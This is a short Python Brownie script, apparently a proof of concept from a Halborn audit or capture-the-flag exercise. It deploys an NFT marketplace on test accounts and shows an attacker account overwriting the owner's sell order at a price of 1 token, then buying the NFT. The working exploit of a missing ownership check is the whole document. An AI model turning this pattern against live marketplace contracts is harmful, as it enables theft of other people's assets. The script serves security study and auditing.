from brownie import NFTMarketplace, HalbornNFT, ApeCoin, accounts


def main():
    ### required accounts
    nft_owner = accounts[0]
    ape_owner = accounts[1]
    market_owner = accounts[2]

    bad = accounts[9]

    ### get contract interfaces
    ape_contract = ApeCoin.deploy({"from": ape_owner})

    nft_contract = HalbornNFT.deploy({"from": nft_owner})

    market = NFTMarketplace.deploy(
        market_owner, ape_contract.address, nft_contract.address, {"from": market_owner}
    )

    ### Mint token to nft_owner
    nft_id = 101
    nft_contract.safeMint(nft_owner, nft_id, {"from": nft_owner})

    ### Approve the market place contract as a spender for this token
    nft_contract.approve(market.address, nft_id, {"from": nft_owner})

    ### Mint ApeCoins to bad account
    bad_amount = 1
    ape_contract.mint(bad, bad_amount, {"from": ape_owner})

    ### Approve the market place contract as a spender for ape tokens
    ape_contract.approve(market.address, bad_amount, {"from": bad})

    ### post sell order from nft_owner account
    order_amount = 100000000000000000000
    market.postSellOrder(nft_id, order_amount, {"from": nft_owner})

    ### 'edit' this sell order from 'bad' account
    market.postSellOrder(nft_id, bad_amount, {"from": bad})

    ### buy this edited sell order from 'bad' account
    market.buySellOrder(nft_id, {"from": bad})
    print("The owner of NFT is " + str(nft_contract.ownerOf(nft_id)) + "\n")
    print("print(bad.address): " + str(bad.address) + "\n")
